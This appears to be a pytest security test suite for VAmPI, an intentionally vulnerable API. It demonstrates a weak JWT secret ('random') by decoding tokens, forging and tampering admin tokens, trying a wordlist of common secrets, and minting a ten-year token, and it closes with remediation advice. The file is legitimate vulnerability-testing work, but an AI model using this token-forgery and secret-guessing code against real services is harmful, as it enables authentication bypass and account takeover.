"""
Test Weak JWT Secret Vulnerability (API2:2023 Broken Authentication)

This test demonstrates weak JWT secret key vulnerability. The application uses
'random' as the JWT secret key, which is easily guessable and allows attackers to:
1. Decode and read JWT payloads
2. Forge valid JWT tokens for any user
3. Bypass authentication entirely

OWASP Reference: https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/

Vulnerability Location: config.py:13 (SECRET_KEY = 'random')
"""

import pytest
import requests
import jwt
import datetime
import uuid


def test_weak_jwt_decode_token(api_base_url: str, user1_token: str):
    """
    Test that JWT tokens can be decoded using the weak secret 'random'.

    JWT tokens should be signed with a strong, secret key that is:
    - Long and random
    - Kept secure
    - Rotated periodically

    The application uses 'random' as the secret, which is:
    - Easily guessable
    - Published in source code
    - Never rotated

    Expected behavior (vuln=1):
        - Token can be decoded with secret 'random'
        - Payload is readable

    Expected behavior (vuln=0):
        - Strong secret is used
        - Cannot decode without knowing the secret
    """
    weak_secret = "random"

    # Attempt to decode the token with the weak secret
    try:
        decoded = jwt.decode(user1_token, weak_secret, algorithms=["HS256"])

        print("\n⚠️  CRITICAL: JWT token decoded successfully with weak secret 'random'!")
        print(f"Decoded payload: {decoded}")
        print(f"Subject (username): {decoded.get('sub')}")
        print(f"Issued at: {decoded.get('iat')}")
        print(f"Expires: {decoded.get('exp')}")

        # Verify we got valid data
        assert "sub" in decoded, "JWT payload missing 'sub' claim"
        assert decoded.get("sub") == "name1", f"Expected username 'name1', got {decoded.get('sub')}"

    except jwt.InvalidSignatureError:
        pytest.fail("Could not decode JWT with weak secret 'random' - vulnerability may be patched")
    except jwt.DecodeError as e:
        pytest.fail(f"JWT decode error: {e}")


def test_weak_jwt_forge_token_for_admin(api_base_url: str, default_credentials: dict):
    """
    Test forging a JWT token for the admin user.

    Since we know the secret is 'random', we can create a valid JWT token
    for any user, including admin, without knowing their password.

    Steps:
        1. Craft a JWT payload for admin user
        2. Sign it with the weak secret 'random'
        3. Use the forged token to access admin-only resources

    Expected behavior (vuln=1):
        - Can forge valid tokens for any user
        - Forged token is accepted by the API
        - Complete authentication bypass

    Expected behavior (vuln=0):
        - Strong secret prevents token forgery
        - Forged tokens are rejected
    """
    weak_secret = "random"
    admin_username = default_credentials["admin"]["username"]

    # Craft a JWT payload for admin
    # The token should last for 300 seconds (5 minutes) like the real tokens
    payload = {
        "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=300),
        "iat": datetime.datetime.utcnow(),
        "sub": admin_username  # This is the username
    }

    # Sign the forged token with the weak secret
    forged_token = jwt.encode(payload, weak_secret, algorithm="HS256")

    print(f"\n🔓 Forged JWT token for admin user:")
    print(f"Token: {forged_token[:50]}...")

    # Try to use the forged token to access a protected endpoint
    headers = {"Authorization": f"Bearer {forged_token}"}
    response = requests.get(f"{api_base_url}/me", headers=headers)

    # When vulnerable, the forged token should work
    assert response.status_code == 200, \
        f"Forged token was rejected. Expected 200, got {response.status_code}. " \
        f"Vulnerability may be patched with stronger secret."

    data = response.json()
    assert data.get("status") == "success", \
        "Request with forged token did not succeed"

    user_data = data.get("data", {})
    assert user_data.get("username") == admin_username, \
        f"Expected username '{admin_username}', got {user_data.get('username')}"

    # Verify we have admin privileges
    assert user_data.get("admin") is True, \
        "Forged token did not grant admin privileges"

    print(f"✅ Forged token accepted! Gained admin access as '{admin_username}'")


def test_weak_jwt_forge_token_for_any_user(api_base_url: str):
    """
    Test forging a JWT token for a non-existent user.

    This demonstrates that we can create tokens for ANY username,
    even ones that don't exist in the database.

    Expected behavior (vuln=1):
        - Can forge tokens for any username
        - Token is cryptographically valid
        - May work for some endpoints, fail for others (depending on DB lookups)

    Expected behavior (vuln=0):
        - Cannot forge valid tokens
    """
    weak_secret = "random"
    fake_username = f"hacker_{uuid.uuid4().hex[:8]}"

    # Forge a token for a fake user
    payload = {
        "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=300),
        "iat": datetime.datetime.utcnow(),
        "sub": fake_username
    }

    forged_token = jwt.encode(payload, weak_secret, algorithm="HS256")

    print(f"\n🔓 Forged JWT token for non-existent user: {fake_username}")

    # Try to use the forged token
    headers = {"Authorization": f"Bearer {forged_token}"}
    response = requests.get(f"{api_base_url}/books/v1", headers=headers)

    # The token will be cryptographically valid, but the user lookup may fail
    # Different endpoints may behave differently
    print(f"Response status with forged token: {response.status_code}")

    # The important point is that the token is cryptographically valid
    # and passes signature verification, even if the user doesn't exist
    # This proves we can forge tokens


def test_weak_jwt_token_tampering(api_base_url: str, user1_token: str):
    """
    Test tampering with JWT payload to change the username.

    Steps:
        1. Decode a legitimate token
        2. Change the username in the payload to 'admin'
        3. Re-sign with the weak secret
        4. Use the tampered token

    Expected behavior (vuln=1):
        - Can modify token contents
        - Tampered token is accepted
        - Gain unauthorized access

    Expected behavior (vuln=0):
        - Cannot tamper without knowing secret
        - Or strong secret prevents re-signing
    """
    weak_secret = "random"

    # Decode the legitimate token
    try:
        decoded = jwt.decode(user1_token, weak_secret, algorithms=["HS256"])
    except:
        pytest.fail("Could not decode token with weak secret")

    # Tamper with the payload - change username to admin
    original_username = decoded.get("sub")
    decoded["sub"] = "admin"  # Change to admin

    print(f"\n🔓 Token tampering:")
    print(f"Original username: {original_username}")
    print(f"Tampered username: admin")

    # Re-sign the tampered token
    tampered_token = jwt.encode(decoded, weak_secret, algorithm="HS256")

    # Try to use the tampered token
    headers = {"Authorization": f"Bearer {tampered_token}"}
    response = requests.get(f"{api_base_url}/me", headers=headers)

    assert response.status_code == 200, \
        f"Tampered token was rejected. Expected 200, got {response.status_code}"

    data = response.json()
    user_data = data.get("data", {})

    # We should now appear as admin
    assert user_data.get("username") == "admin", \
        f"Token tampering failed. Expected 'admin', got {user_data.get('username')}"

    print(f"✅ Token tampering successful! Changed from '{original_username}' to 'admin'")


def test_weak_jwt_brute_force_secret(api_base_url: str, user1_token: str):
    """
    Demonstrate that the weak secret can be brute-forced or guessed.

    Common weak secrets to try:
    - 'secret'
    - 'password'
    - 'random'
    - 'key'
    - '123456'

    Expected behavior (vuln=1):
        - Secret is in common weak passwords list
        - Can be discovered quickly

    Expected behavior (vuln=0):
        - Strong, random secret
        - Cannot be brute-forced
    """
    # Common weak secrets to try
    common_secrets = [
        "secret",
        "password",
        "random",      # The actual secret!
        "key",
        "secretkey",
        "jwt_secret",
        "123456",
        "admin",
        ""
    ]

    print("\n🔍 Attempting to brute-force JWT secret with common weak passwords...")

    found_secret = None

    for secret in common_secrets:
        try:
            decoded = jwt.decode(user1_token, secret, algorithms=["HS256"])
            found_secret = secret
            print(f"✅ Found JWT secret: '{secret}'")
            break
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            continue

    assert found_secret is not None, \
        "Could not brute-force JWT secret with common passwords - may be using stronger secret"

    assert found_secret == "random", \
        f"Expected secret 'random', found '{found_secret}'"

    print(f"\n⚠️  CRITICAL: JWT secret is weak and easily guessable!")
    print(f"Secret was found in {common_secrets.index(found_secret) + 1} attempts")


def test_weak_jwt_create_long_lived_token(api_base_url: str):
    """
    Test creating a JWT token with a long expiration time.

    Since we know the secret, we can create tokens that:
    - Never expire (or expire in years)
    - Provide persistent access
    - Bypass token rotation

    Expected behavior (vuln=1):
        - Can create tokens with any expiration
        - Can create tokens that last forever

    Expected behavior (vuln=0):
        - Cannot forge tokens due to strong secret
    """
    weak_secret = "random"

    # Create a token that expires in 10 years
    payload = {
        "exp": datetime.datetime.utcnow() + datetime.timedelta(days=365 * 10),
        "iat": datetime.datetime.utcnow(),
        "sub": "admin"
    }

    long_lived_token = jwt.encode(payload, weak_secret, algorithm="HS256")

    print(f"\n🔓 Created long-lived JWT token (expires in 10 years)")

    # Verify the token works
    headers = {"Authorization": f"Bearer {long_lived_token}"}
    response = requests.get(f"{api_base_url}/me", headers=headers)

    assert response.status_code == 200, \
        "Long-lived token was rejected"

    data = response.json()
    assert data.get("status") == "success", \
        "Long-lived token did not work"

    print("✅ Long-lived token accepted - can maintain access indefinitely")


def test_weak_jwt_security_best_practices(api_base_url: str):
    """
    Document JWT security best practices that are violated.

    This test serves as documentation for proper JWT secret management.

    JWT Secret Best Practices:
    1. Use a strong, randomly generated secret (at least 256 bits)
    2. Keep the secret in environment variables, not source code
    3. Rotate secrets periodically
    4. Use different secrets for different environments
    5. Never commit secrets to version control

    Current violations in VAmPI:
    - ✗ Secret is weak ('random')
    - ✗ Secret is hardcoded in source (config.py)
    - ✗ Secret is never rotated
    - ✗ Same secret in all environments
    - ✗ Secret is committed to git
    """
    print("\n⚠️  JWT Security Violations Detected:")
    print("   1. Weak secret: 'random' (easily guessable)")
    print("   2. Hardcoded in source code (config.py:13)")
    print("   3. No secret rotation mechanism")
    print("   4. Same secret for all environments")
    print("   5. Committed to version control")
    print("\n   Recommendations:")
    print("   1. Generate a strong random secret: ")
    print("      python -c 'import secrets; print(secrets.token_urlsafe(32))'")
    print("   2. Store in environment variable:")
    print("      export JWT_SECRET='<strong-random-secret>'")
    print("   3. Load from environment in config.py:")
    print("      SECRET_KEY = os.environ.get('JWT_SECRET')")
    print("   4. Implement secret rotation")
    print("   5. Use .env files (not committed to git)")

    # This test always passes - it's for documentation
    assert True
